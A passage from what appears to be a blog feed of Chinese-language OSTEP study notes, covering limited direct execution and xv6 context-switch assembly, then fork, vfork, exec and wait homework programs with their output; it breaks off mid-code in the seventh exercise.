        <content type="html"><![CDATA[<h1 id="Mechanism-Limited-Direct-Execution"><a href="#Mechanism-Limited-Direct-Execution" class="headerlink" title="Mechanism:Limited Direct Execution"></a>Mechanism:Limited Direct Execution</h1><h2 id="受限制的操作"><a href="#受限制的操作" class="headerlink" title="受限制的操作"></a>受限制的操作</h2><p>进程跑在我们的操作系统上，总不能让他为所欲为吧，cpu提供给了我们保护模式，从而有了用户模式和内核模式，我们的操作系统运行在内核模式，可以访问机器全部资源，用户进程运行在用户模式，受到限制，但是用户程序有时必须做一些特权操作，操作系统就必须提供给他们一些接口:系统调用。</p><p>异常是异常控制流的一种形式，它一部分由硬件实现，一部分由操作系统实现。陷阱是有意的异常,陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口系统调用，在 x86-64系统上，系统调用是通过一条称为 syscall的陷阱指令来提供的</p><p>加电开机后，处于内核模式，操作系统内核会告诉硬件我们的陷阱处理程序(陷阱表)在哪，执行陷阱处理程序前，<strong>处理器</strong>会把进程的一些寄存器值等压到该进程内核栈(在我们32位程序进程说的高1G内核空间里，在x86的32位机器上内核栈大小可以为4KB或8KB)，执行完陷阱返回时再弹出</p><h2 id="在进程之间切换"><a href="#在进程之间切换" class="headerlink" title="在进程之间切换"></a>在进程之间切换</h2><p>操作系统如何重新获得 CPU 的控制权</p><h3 id="协作方式-等待系统调用"><a href="#协作方式-等待系统调用" class="headerlink" title="协作方式:等待系统调用"></a>协作方式:等待系统调用</h3><p>程序主动进行系统调用或其他类型的异常来重新获取控制权</p><h3 id="非协作方式：操作系统进行控制"><a href="#非协作方式：操作系统进行控制" class="headerlink" title="非协作方式：操作系统进行控制"></a>非协作方式：操作系统进行控制</h3><p>协作方式对于一些只循环的程序无能为力，那就用硬件中断</p><p>利用时钟设备，每隔几毫秒产生一次中断，中断处理程序前，<strong>处理器</strong>也会把一些当前进程信息压入其内核栈</p><h3 id="保存和恢复上下文"><a href="#保存和恢复上下文" class="headerlink" title="保存和恢复上下文"></a>保存和恢复上下文</h3><p>接下来就是<strong>调度程序</strong>根据调度策略决定怎么跑路Zzz</p><p>决定切换的话，会进行上下文切换(context switch)</p><p>假如由A切换到B</p><p>A的寄存器首先被硬件保存到该进程的内核栈，进入内核态，操作系统切换时，调用switch再次把寄存器保存到操作系统维持的<strong>A的进程结构体的内存</strong>里，然后把<strong>要调度B进程结构体的内存里的值</strong>恢复到寄存器，这个时候栈指针已经变为了B的内核栈，从内核栈恢复寄存器就是恢复B的寄存器了，就可以把之前硬件保存的B进程的东西恢复，回到用户模式执行B的指令</p><h4 id="xv6上下文切换源码"><a href="#xv6上下文切换源码" class="headerlink" title="xv6上下文切换源码"></a>xv6上下文切换源码</h4><p>书里的代码有错误，去找了波源码 <a href="https://github.com/mit-pdos/xv6-public">https://github.com/mit-pdos/xv6-public</a> </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#   void swtch(struct context *old, struct context *new);</span><br><span class="line">#  </span><br><span class="line"># Save current register context in old</span><br><span class="line"># and then load register context from new.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  # Save old registers</span><br><span class="line">  movl 4(%esp), %eax</span><br><span class="line"></span><br><span class="line">  popl 0(%eax)  # %eip</span><br><span class="line">  movl %esp, 4(%eax)</span><br><span class="line">  movl %ebx, 8(%eax)</span><br><span class="line">  movl %ecx, 12(%eax)</span><br><span class="line">  movl %edx, 16(%eax)</span><br><span class="line">  movl %esi, 20(%eax)</span><br><span class="line">  movl %edi, 24(%eax)</span><br><span class="line">  movl %ebp, 28(%eax)</span><br><span class="line"></span><br><span class="line">  # Load new registers</span><br><span class="line">  movl 4(%esp), %eax  # not 8(%esp) - popped return address above</span><br><span class="line"></span><br><span class="line">  movl 28(%eax), %ebp</span><br><span class="line">  movl 24(%eax), %edi</span><br><span class="line">  movl 20(%eax), %esi</span><br><span class="line">  movl 16(%eax), %edx</span><br><span class="line">  movl 12(%eax), %ecx</span><br><span class="line">  movl 8(%eax), %ebx</span><br><span class="line">  movl 4(%eax), %esp</span><br><span class="line">  pushl 0(%eax)  # %eip</span><br><span class="line"></span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the %fs etc. segment registers,</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Save all the regular registers so we don&#x27;t need to care</span></span><br><span class="line"><span class="comment">// which are caller save, but not the return register %eax.</span></span><br><span class="line"><span class="comment">// (Not saving %eax just simplifies the switching code.)</span></span><br><span class="line"><span class="comment">// The layout of context must match code in swtch.S.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> eip;</span><br><span class="line">  <span class="type">int</span> esp;</span><br><span class="line">  <span class="type">int</span> ebx;</span><br><span class="line">  <span class="type">int</span> ecx;</span><br><span class="line">  <span class="type">int</span> edx;</span><br><span class="line">  <span class="type">int</span> esi;</span><br><span class="line">  <span class="type">int</span> edi;</span><br><span class="line">  <span class="type">int</span> ebp;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>根据函数声明和32位压栈规则，栈刚开始是这样的</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>movl 4(%esp), %eax</code>把old(*)给eax</p><p><code>popl 0(%eax)把eip寄存器给到old-&gt;eip</code></p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+ </span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|     old(*)   | </span><br><span class="line">+--------------+</span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p>后面一直到<code>movl %ebp, 28(%eax)</code>把old的context结构体里内容填满</p><p><code>movl 4(%esp), %eax</code>把新的context地址给到eax</p><p>一直到<code>movl 4(%eax), %esp</code>把新context里的内容恢复到寄存器</p><p>可以看的栈帧寄存器ebp，esp都变了，切换到了B内核栈</p><p><code> pushl 0(%eax)  # %eip</code>把newb-&gt;eip压栈</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewB的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br><span class="line">|              | </span><br><span class="line">+--------------+ </span><br><span class="line">|              |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><h5 id="新版"><a href="#新版" class="headerlink" title="新版"></a>新版</h5><p>其实上面是比较早版本的swtch，最新的已经变了</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//PAGEBREAK: 17</span></span><br><span class="line"><span class="comment">// Saved registers for kernel context switches.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save all the segment registers (%cs, etc),</span></span><br><span class="line"><span class="comment">// because they are constant across kernel contexts.</span></span><br><span class="line"><span class="comment">// Don&#x27;t need to save %eax, %ecx, %edx, because the</span></span><br><span class="line"><span class="comment">// x86 convention is that the caller has saved them.</span></span><br><span class="line"><span class="comment">// Contexts are stored at the bottom of the stack they</span></span><br><span class="line"><span class="comment">// describe; the stack pointer is the address of the context.</span></span><br><span class="line"><span class="comment">// The layout of the context matches the layout of the stack in swtch.S</span></span><br><span class="line"><span class="comment">// at the &quot;Switch stacks&quot; comment. Switch doesn&#x27;t save eip explicitly,</span></span><br><span class="line"><span class="comment">// but it is on the stack and allocproc() manipulates it.</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">context</span> &#123;</span></span><br><span class="line">  uint edi;</span><br><span class="line">  uint esi;</span><br><span class="line">  uint ebx;</span><br><span class="line">  uint ebp;</span><br><span class="line">  uint eip;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"># Context <span class="keyword">switch</span></span><br><span class="line">#</span><br><span class="line"><span class="meta">#   void swtch(struct context **old, struct context *new);</span></span><br><span class="line"># </span><br><span class="line"># Save the current registers on the <span class="built_in">stack</span>, creating</span><br><span class="line"><span class="meta"># a struct context, and save its address in *old.</span></span><br><span class="line"># Switch stacks to new and pop previously-saved registers.</span><br><span class="line"></span><br><span class="line">.globl swtch</span><br><span class="line">swtch:</span><br><span class="line">  movl <span class="number">4</span>(%esp), %eax</span><br><span class="line">  movl <span class="number">8</span>(%esp), %edx</span><br><span class="line"></span><br><span class="line">  # Save old callee-saved registers</span><br><span class="line">  pushl %ebp</span><br><span class="line">  pushl %ebx</span><br><span class="line">  pushl %esi</span><br><span class="line">  pushl %edi</span><br><span class="line"></span><br><span class="line">  # Switch stacks</span><br><span class="line">  movl %esp, (%eax)</span><br><span class="line">  movl %edx, %esp</span><br><span class="line"></span><br><span class="line">  # Load new callee-saved registers</span><br><span class="line">  popl %edi</span><br><span class="line">  popl %esi</span><br><span class="line">  popl %ebx</span><br><span class="line">  popl %ebp</span><br><span class="line">  ret</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp</span></span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+4</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;-- <span class="comment">%esp+8</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code> movl 4(%esp), %eax   movl 8(%esp), %edx</code></p><p>old(**)给到eax</p><p>new(*)给到edx</p><p>然后直接把context push到栈上</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">oldA的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(A)  |</span><br><span class="line">+--------------+ &lt;--<span class="comment">%eax</span></span><br><span class="line">|     old(**)  | </span><br><span class="line">+--------------+ &lt;--<span class="comment">%edx</span></span><br><span class="line">|     new(*)   |</span><br><span class="line">+--------------+</span><br></pre></td></tr></table></figure><p><code>  movl %esp, (%eax)</code></p><p>直接把当前esp指向的地址写到oldA的context的地址，就是把栈上的这些当作context结构体，没去再去单独申请内存，为了提高效率??</p><p><code>movl %edx, %esp</code></p><p>把栈切换到NewB的内核栈,由于之前B也被切换过所以他的栈顶也是context结构体</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">NewB的内核栈</span><br><span class="line">+--------------+</span><br><span class="line">|               |</span><br><span class="line">+--------------+&lt;-- <span class="comment">%esp</span></span><br><span class="line">|      <span class="comment">%edi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%esi    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebx    |</span></span><br><span class="line">+--------------+</span><br><span class="line">|      <span class="comment">%ebp       |</span></span><br><span class="line">+--------------+ </span><br><span class="line">|      ret(B)  |</span><br><span class="line">+--------------+ </span><br></pre></td></tr></table></figure><p>pop后ret就可以切换到B指令执行</p><h3 id="并发问题！！！"><a href="#并发问题！！！" class="headerlink" title="并发问题！！！"></a>并发问题！！！</h3><p>系统调用时发生时钟中断?</p><p>中断处理时发生中断?</p><p>简单的在中断时禁止中断可能会导致中断丢失?</p>]]></content>
      
      
      
        <tags>
            
            <tag> OSTEP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSTEP:5 Process API Homework</title>
      <link href="/2023/04/12/OSTEP-homework-5-Process-API/"/>
      <url>/2023/04/12/OSTEP-homework-5-Process-API/</url>
      
        <content type="html"><![CDATA[<h2 id="Process-API-Homework"><a href="#Process-API-Homework" class="headerlink" title="Process API Homework"></a>Process API Homework</h2><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">CC=gcc</span><br><span class="line">GCCFLAGS= -g -Wall</span><br><span class="line">TARGET = <span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span></span><br><span class="line">SRC=<span class="variable">$(<span class="built_in">word</span> 1,<span class="variable">$(MAKECMDGOALS)</span>)</span>.c</span><br><span class="line"></span><br><span class="line"><span class="variable">$(TARGET)</span>:<span class="variable">$(SRC)</span></span><br><span class="line">    <span class="variable">$(CC)</span> <span class="variable">$(GCCFLAGS)</span> <span class="variable">$(SRC)</span> -o <span class="variable">$(TARGET)</span></span><br></pre></td></tr></table></figure><ol><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    x = <span class="number">2</span>;</span><br><span class="line">    <span class="type">pid_t</span> rc = fork();</span><br><span class="line">    <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (rc == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">        x = <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;fork %d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 1</span><br><span class="line">gcc -g -Wall 1.c -o 1</span><br><span class="line">1.c: In function ‘main’:</span><br><span class="line">1.c:20:9: warning: implicit declaration of function ‘wait’ [-Wimplicit-function-declaration]</span><br><span class="line">         wait(NULL);</span><br><span class="line">         ^</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./1</span><br><span class="line">1</span><br><span class="line">fork 2</span><br><span class="line">fork 3</span><br><span class="line">2</span><br></pre></td></tr></table></figure><blockquote><p>子进程和父进程变量没有任何关系</p></blockquote><ol start="2"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="comment">// #define NDEBUG</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;./flag&quot;</span>,O_RDWR|O_APPEND);</span><br><span class="line">    assert(<span class="number">-1</span> != fd);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span>==pid)&#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;child&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;child&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">char</span> buf[<span class="number">100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        read(fd, buf, <span class="keyword">sizeof</span>(<span class="type">char</span>) * <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;parent:%s\n&quot;</span>, buf);</span><br><span class="line">        <span class="comment">// usleep(100);</span></span><br><span class="line">        <span class="built_in">memcpy</span>(buf, <span class="string">&quot;parent&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;parent&quot;</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> err = write(fd, buf, <span class="built_in">strlen</span>(buf) * <span class="keyword">sizeof</span>(<span class="type">char</span>));</span><br><span class="line">            assert(err);</span><br><span class="line">        &#125;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./2</span><br><span class="line">parent:1111111111</span><br><span class="line">child:xxxxxxxxxx</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; cat flag</span><br><span class="line">1111111111xxxxxxxxxxx</span><br><span class="line">parent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxparent1111parent1111childxxxxxchildxxxxxparent1111parent1111childxxxxxchildxxxxxchildxxxxx⏎                  </span><br></pre></td></tr></table></figure><blockquote><p>可以看出父子是共享文件描述符的，父进程读后文件的读写位置往后移到了xxxxx，可以用<code>    lseek(fd, 0, SEEK_SET);</code>把他移到开头</p><p>并发的写入由于操作系统调度顺序问题，写入顺序是随机的，竞争关系的他们并不能同时使用fd，操作系统应该加了一些锁</p></blockquote><ol start="3"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        x = <span class="number">66</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;hello  &quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;world-----&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; make 3</span><br><span class="line">gcc -g -Wall 3.c -o 3</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./3</span><br><span class="line">hello  world-----66⏎    </span><br></pre></td></tr></table></figure><blockquote><p>可以调用vfork函数，和fork函数的区别就是他会阻塞父进程，直到子进程调用exec或exit才恢复调度可能，在此之前和父进程共享所以内存包括栈！可以看的x已经被修改</p></blockquote><ol start="4"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="type">char</span>* cmd = <span class="string">&quot;/bin/ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* name = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="type">char</span>* arg[] = &#123; <span class="string">&quot;ls&quot;</span>, <span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="literal">NULL</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// execl(cmd, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</span></span><br><span class="line">        execlp(name, <span class="string">&quot;ls&quot;</span>,<span class="string">&quot;-a&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;-h&quot;</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="comment">// execve(cmd, arg, envp);</span></span><br><span class="line">        <span class="comment">// execv(cmd, arg);</span></span><br><span class="line">        <span class="comment">// execvp(name, arg);</span></span><br><span class="line">        <span class="comment">// execle(cmd, &quot;ls&quot;, NULL, envp);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>以exec为前缀</p><ul><li>l(list)使用参数地址列表,以空指针结束标志<code>execl(&quot;/bin/ls&quot;, &quot;ls&quot;, &quot;-a&quot;, &quot;-l&quot;, &quot;-h&quot;, NULL);</code>。第二个参数ls没有太大意义，如果要给ls传参必须写上这个字符串，</li><li>v(vector) 以 NULL结尾字符串数组的指针作参数</li><li>p(path) PATH环境变量指定的目录搜索可执行文件,可以不用写路径</li><li>e(environment) 可以传存有环境变量envp字符串地址的指针数组的地址，无后缀e的话使用当前进程环境变量</li></ul></blockquote><ol start="5"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = vfork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;gr&quot;</span>);</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, rs);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> rs = wait(<span class="literal">NULL</span>);</span><br><span class="line">        assert(pid == rs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rxer@grxer /m/h/S/O/o/cpu-api&gt; make 5</span><br><span class="line">gcc -g -Wall 5.c -o 5</span><br><span class="line">grxer@grxer /m/h/S/O/o/cpu-api&gt; ./5</span><br><span class="line">gr</span><br><span class="line">-1</span><br></pre></td></tr></table></figure><blockquote><p>父进程wait成功等待了返回子进程id，否则-1，子进程返回-1</p></blockquote><ol start="6"><li></li></ol><blockquote><p>其他更精细的事情，比如非阻塞等待：希望子进程退出能够被我父进程检测到，同时我又不希望我父进程处于阻塞等待<code>waitpid(pid,NULL,WNOHANG)</code></p></blockquote><ol start="7"><li></li></ol><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="number">0</span> == pid) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;child hello&quot;</span>);</span><br><span class="line">        close(STDOUT_FILENO);</span><br><span class="line">        <span 